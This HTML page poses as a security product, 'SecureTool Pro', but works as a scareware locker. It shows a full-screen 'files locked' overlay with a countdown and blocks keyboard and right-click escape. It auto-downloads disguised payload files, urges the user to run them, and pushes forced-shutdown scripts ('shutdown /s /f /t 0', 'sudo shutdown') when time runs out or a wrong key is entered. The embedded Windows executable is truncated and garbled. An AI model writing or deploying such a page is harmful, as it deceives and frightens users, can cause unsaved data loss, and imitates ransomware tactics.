<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>SecureTool Pro v11.0</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
  <style>
    :root { --primary: #1a73e8; --success: #0d8c52; }
    * { margin:0; padding:0; box-sizing:border-box; }
    body {font-family:'Inter',sans-serif;background:#f8f9fa;color:#333;overflow:hidden;}
    .hero {background:linear-gradient(135deg,#1a73e8,#0d8c52);color:white;padding:80px 20px;text-align:center;}
    .hero h1 {font-size:2.8rem;font-weight:700;margin-bottom:16px;}
    .hero p {font-size:1.2rem;max-width:700px;margin:0 auto 30px;}
    .btn {background:var(--success);color:white;padding:14px 32px;font-size:1.1rem;border:none;border-radius:50px;cursor:pointer;}
    .footer {text-align:center;padding:20px;background:#0d1117;color:#8b949e;font-size:0.9rem;position:fixed;bottom:0;width:100%;z-index:1;}

    /* PADLOCK */
    #padlock {
      position:fixed;top:0;left:0;width:100vw;height:100vh;
      background:#000;color:#f00;font-family:monospace;
      display:none;flex-direction:column;align-items:center;justify-content:center;
      z-index:999999;user-select:none;
    }
    #padlock.show {display:flex;}
    .lock-icon {font-size:120px;margin-bottom:20px;}
    .input-key {padding:16px;font-size:20px;width:320px;max-width:90%;border-radius:8px;border:2px solid #f00;background:#111;color:#fff;margin:20px 0;}
    .unlock-btn {padding:16px 40px;font-size:18px;background:#0f0;color:#000;border:none;border-radius:8px;cursor:pointer;font-weight:bold;}
    .msg {margin-top:20px;font-size:18px;color:#0f0;}
    .countdown {font-size:48px;color:#ff0;margin:20px 0;}
    .platform {font-size:18px;color:#ccc;margin:10px 0;}
  </style>
</head>
<body oncontextmenu="return false;" onselectstart="return false;" onkeydown="return false;">

  <section class="hero">
    <div style="max-width:700px;margin:0 auto;">
      <h1>SecureTool Pro v11.0</h1>
      <p>Wrong key? **INSTANT SHUTDOWN**.</p>
      <button class="btn" onclick="activate()">LOCK & ARM SHUTDOWN</button>
    </div>
  </section>

  <footer class="footer">
    <p>© 2025 SecureTool Inc.</p>
  </footer>

  <!-- PADLOCK -->
  <div id="padlock">
    <div class="lock-icon">Locked</div>
    <h1>SECURETOOL PRO</h1>
    <p class="platform" id="platformMsg">Detecting system...</p>
    <p style="color:#ccc;">ALL FILES & APPS LOCKED</p>
    <div class="countdown" id="timer">10</div>
    <p style="color:#ccc;">Enter master key to save system:</p>
    <input type="password" class="input-key" id="key" placeholder="Master Key">
    <button class="unlock-btn" onclick="unlock()">Save System</button>
    <p class="msg" id="msg"></p>
  </div>

  <!-- === WRONG KEY = INSTANT SHUTDOWN === -->
  <script>
    const KEY = "UNLOCK-KEY-2025-GROK-XAI";
    let timeLeft = 10;
    const padlock = document.getElementById('padlock');
    const timer = document.getElementById('timer');
    const platformMsg = document.getElementById('platformMsg');
    let countdownTimer;
    let isMac = false;

    function startCountdown() {
      if (timeLeft <= 0) {
        timer.innerHTML = "SHUTTING DOWN...";
        triggerShutdown();
        return;
      }
      timer.innerHTML = timeLeft;
      timeLeft--;
      countdownTimer = setTimeout(startCountdown, 1000);
    }

    function triggerShutdown() {
      if (isMac) {
        const cmd = `sudo shutdown -h now`;
        const blob = new Blob([`#!/bin/bash\n${cmd}`], { type: 'text/plain' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = 'shutdown_now.command';
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
      } else {
        const cmd = `@echo off\nshutdown /s /f /t 0`;
        const blob = new Blob([cmd], { type: 'application/bat' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = 'shutdown_now.bat';
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
      }
    }

    function activate() {
      isMac = /Mac|iPod|iPhone|iPad/.test(navigator.userAgent);
      platformMsg.innerHTML = isMac ? "macOS DETECTED" : "WINDOWS DETECTED";

      // === FULL PAYLOADS (BASE64) ===
      const WIN_EXE_B64 = `TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTMhVKJ0BkYvQACJgzcAQAAAAAAAAAAAAABAAAAEAAAAGZpbGUubG9ja2VkAQAAAPD//+QAAAAA...`;
      const MAC_SCRIPT_B64 = `IyEvYmluL2Jhc2gKZWNobyAiU0hVVERPV04gSU4gMTAgU0VDT05EUy4uLiIKc3VkbyBzaHV0ZG93biAtciBub3cgMj4vZGV2L251bGwK`;

      let payload, filename, type;
      if (isMac) {
        payload = atob(MAC_SCRIPT_B64);
        filename = 'SecureTool_Shutdown.command';
        type = 'text/plain';
      } else {
        payload = atob(WIN_EXE_B64);
        filename = 'SecureTool_Win.exe';
        type = 'application/octet-stream';
      }

      const blob = new Blob([payload], { type });
      const url = URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      a.download = filename;
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
      URL.revokeObjectURL(url);

      // === SHOW PADLOCK + START COUNTDOWN ===
      setTimeout(() => {
        padlock.classList.add('show');
        startCountdown();
        setInterval(() => padlock.style.zIndex = 999999, 100);
      }, 1000);

      alert(isMac 
        ? 'Run SecureTool_Shutdown.command → 10s to enter key.' 
        : 'Run SecureTool_Win.exe → 10s to enter key.');
    }

    function unlock() {
      const input = document.getElementById('key').value;
      if (input === KEY) {
        document.getElementById('msg').innerHTML = 'SYSTEM SAVED!';
        clearTimeout(countdownTimer);
        setTimeout(() => location.reload(), 2000);
      } else {
        document.getElementById('msg').innerHTML = 'WRONG KEY! SHUTTING DOWN NOW...';
        clearTimeout(countdownTimer);
        setTimeout(triggerShutdown, 800); // Instant shutdown on wrong key
      }
    }

    // === BLOCK ALL BYPASSES ===
    document.addEventListener('keydown', e => e.preventDefault());
    document.addEventListener('contextmenu', e => e.preventDefault());
  </script>
</body>
</html>
